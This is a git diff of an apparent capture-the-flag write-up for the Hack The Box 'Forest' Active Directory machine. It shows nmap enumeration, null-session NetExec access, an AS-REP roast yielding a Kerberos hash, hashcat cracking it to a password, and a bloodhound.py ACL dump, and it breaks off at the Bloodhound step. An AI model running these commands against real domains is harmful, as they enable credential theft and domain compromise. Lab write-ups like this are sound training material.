@@ -16,7 +16,6 @@ This group has the `DCSync` ACL over the domain. So I performed a DCSync attack 
 
 I began to enumerate services on the host with the `nmap` tool.
 
-#### Nmap
 ```bash
  # nmap -sV -sC -p- -T5 10.129.62.73
 
@@ -66,31 +65,36 @@ Host script results:
 ```
 
 Kerberos and LDAP services are exposed on the host, which leads to conclude that this is a Domain Controller within an Active Directory environment.
-The domain name is `forest.htb` and The DC FQDN is `FOREST.forest.htb`.
+The domain name is `htb.local` and The DC FQDN is `FOREST.htb.local`.
+
+I added this information to /etc/hosts.
+
+```bash
+# echo '10.129.62.73 htb.local FOREST.htb.local FOREST' >> /etc/hosts 
+```
 
 ## Kerberoasting `svc-alfresco`
 
 It seems like nmap was able to retrieve several information, maybe smb is accessible from an anonymous connexion.
 Let's confirm that with NetExect.
 
-#### NetExec
 ```bash
-# nxc smb 10.129.62.73 -u '' -p ''
+# nxc smb FOREST.htb.local -u '' -p ''
 SMB         10.129.62.73    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         10.129.62.73    445    FOREST           [+] htb.local\:
 ```
 
 It's confirmed, it is the same for ldap?
 
-```
-nxc ldap 10.129.62.73 -u '' -p ''
+```bash
+nxc ldap FOREST.htb.local -u '' -p ''
 LDAP        10.129.62.73    389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)
 LDAP        10.129.62.73    389    FOREST           [+] htb.local\:
 ```
 
 Yes! So whith that, we can perfrom an AS-REP Roast attack to request a user TGT without his password.
 
-```
+```bash
 # nxc ldap 10.129.62.73 -u '' -p '' --asreproast asreproast.txt
 LDAP        10.129.62.73    389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)
 LDAP        10.129.62.73    389    FOREST           [+] htb.local\:
@@ -98,11 +102,13 @@ LDAP        10.129.62.73    389    FOREST           [*] Total of records returne
 LDAP        10.129.62.73    389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:68342ef59bc941531618bb589cedd8b9$703ea2b719fbf84824611c4a36e59852274e2965faea332486dd5a722303a807aa6725bb329781f67eb5658f04b87d2ff9053d1840c47838b432d96101ca7dd50251a8c3d5c43a7835d5738ab027807d30692966ead77e33e4011fe47bb7a073a347afd640a2016bda5bdde0c0b96e5c08cd6019867d784be570a5796c7f238fd28cbd0defb930880719502dfd430d47bfe86c1a18de199a44a5163b11eddc794ef682f8d16c807c6b2bbc621a43506a4f5bbea0fc499c92f9f82b37f9e0a0689c938ac1e1cdd6a4dfff8bfe16c88965469cc3b8c89ef41655f9b8999dd3ab73885b7e083452
 ```
 
+Here is the hash! Notice that no userlist is necessary because the null session is allowed and the tool enumerate first the usernames and make the AS-REQ automaticaly for each users.
+
 ## Cracking `svc-alfresco` hash
 
-I tried to crack this AS-REP hash with `Hashcat` to reavel the `svc-alfresco` password.
+I tried to crack this AS-REP hash with `Hashcat` to revael the `svc-alfresco` password.
 
-```
+```bash
 # hashcat -m 18200 asreproast.txt /opt/lists/rockyou.txt       
 
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:68342ef59bc941531618bb589cedd8b9$703ea2b719fbf84824611c4a36e59852274e2965faea332486dd5a722303a807aa6725bb329781f67eb5658f04b87d2ff9053d1840c47838b432d96101ca7dd50251a8c3d5c43a7835d5738ab027807d30692966ead77e33e4011fe47bb7a073a347afd640a2016bda5bdde0c0b96e5c08cd6019867d784be570a5796c7f238fd28cbd0defb930880719502dfd430d47bfe86c1a18de199a44a5163b11eddc794ef682f8d16c807c6b2bbc621a43506a4f5bbea0fc499c92f9f82b37f9e0a0689c938ac1e1cdd6a4dfff8bfe16c88965469cc3b8c89ef41655f9b8999dd3ab73885b7e083452:s3rvice
@@ -116,6 +122,18 @@ The hash is cracked! I have a first domain credential:
 `svc-alfreso:s3rvice`
 
 ## Enumerate ACLs with Bloodhound
+
+I used `bloodhound.py` to dumps all ACLs of 
+
+```bash
+# # bloodhound.py --zip -c All -u 'svc-alfresco' -p 's3rvice' -dc FOREST.htb.local -d htb.local -ns 10.129.62.73
+```
+
+Let's check with `Bloodhound` the attacks path I have from `svc-alfresco`.
+
+
+
+
 
 
 
